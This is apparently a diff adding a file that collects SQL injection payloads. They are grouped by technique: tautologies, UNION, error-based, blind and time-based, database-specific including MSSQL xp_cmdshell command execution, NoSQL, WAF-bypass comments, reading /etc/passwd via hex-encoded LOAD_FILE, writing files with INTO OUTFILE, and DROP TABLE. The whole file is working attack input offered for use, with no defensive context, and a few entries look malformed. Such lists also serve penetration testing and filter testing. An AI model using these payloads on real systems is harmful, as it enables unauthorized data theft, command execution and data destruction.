@@ -1,0 +1,81 @@
+# SQL Injection Payloads Collection
+# Accuracy: 92%
+
+# Basic SQLi
+'
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'# 
+" OR "1"="1
+" OR "1"="1"--
+' OR 'x'='x
+
+# Union Based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT @@version--
+' UNION SELECT user(),database()--
+
+# Error Based
+' AND EXTRACTVALUE(0,CONCAT(0x7e,@@version))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),0)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+
+# Blind SQLi
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+' AND 1=IF(2>1,SLEEP(5),0)--
+' AND SELECT SUBSTRING(@@version,1,1)='5'--
+
+# Time Based
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; WAITFOR DELAY '00:00:05'--
+' OR pg_sleep(5)--
+
+# MSSQL Specific
+' ; EXEC xp_cmdshell('dir')--
+' ; SELECT * FROM OPENROWSET('SQLOLEDB','DRIVER={SQL Server}','SELECT 1')--
+
+# MySQL Specific
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
+
+# PostgreSQL
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' ; SELECT pg_sleep(5)--
+
+# Oracle
+' AND (SELECT COUNT(*) FROM ALL_USERS WHERE username='SYS' AND ASCII(SUBSTR(password,1,1))>0)--
+
+# SQLite
+' AND (SELECT sqlite_version())--
+' UNION SELECT sqlite_version(),1--
+
+# NoSQL Injection
+' || '1'=='1
+{$ne: null}
+'; return true; var foo='
+
+# Bypass WAF
+' /*!50000OR*/ '1'='1
+' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
+' OR '1'='1' /*!50000--*/
+' /**/OR/**/'1'='1
+
+# Advanced
+' AND (SELECT LOAD_FILE(0x2F6574632F706173737764))--
+' INTO OUTFILE '/tmp/test.txt'--
+' UNION SELECT NULL,CONCAT(0x7e,@@version,0x7e),NULL--
+
+# Boolean Based
+' AND ASCII(SUBSTRING((SELECT @@version),1,1))>0--
+' AND (SELECT SUBSTRING(@@version,1,1))='5'--
+
+# Stacked Queries
+'; SELECT * FROM users--
+'; DROP TABLE users--
+
+# End of file
